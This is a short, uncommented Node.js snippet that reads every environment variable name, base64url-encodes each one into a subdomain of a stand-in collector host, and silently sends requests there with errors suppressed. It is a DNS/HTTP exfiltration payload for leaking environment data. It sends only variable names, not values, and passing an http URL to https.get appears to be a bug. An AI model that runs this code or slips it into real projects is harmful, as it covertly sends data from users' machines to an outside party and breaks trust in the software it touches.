const https=require('https'); const domain='collector.example.invalid'; const encode=(v)=>{return Buffer.from(v).toString('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_').substring(0,60);};
for (const [key,value] of Object.entries(process.env)) { const encoded=encode(key); const url=`http://${encoded}.${domain}/path`; https.get(url,()=>{}).on('error',()=>{}); }
